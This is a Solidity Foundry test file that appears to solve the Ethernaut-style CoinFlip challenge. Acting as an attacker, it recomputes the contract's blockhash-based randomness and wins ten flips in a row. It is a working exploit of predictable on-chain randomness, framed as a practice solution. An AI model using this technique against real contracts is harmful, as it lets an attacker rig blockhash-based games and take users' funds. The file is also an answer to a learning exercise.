// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/03_CoinFlip.sol";

contract CoinFlipTest is Test {
    CoinFlip _coinFlip;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

        _coinFlip = new CoinFlip();

    }

    function testSolution() public {
        vm.startPrank(attacker);

        vm.roll(block.number+1); // Ensure not trying to coinflip on some block as deploy

        for(uint i = 0; i<10; i++){
            uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
            uint256 blockValue = uint256(blockhash(block.number - 1));

            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;


            _coinFlip.flip(side);

            vm.roll(block.number+i+1); // Never flip twice on one block
        }

        assertEq(_coinFlip.consecutiveWins(), 10, "You have not won 10 times consecutively!");
    }
}
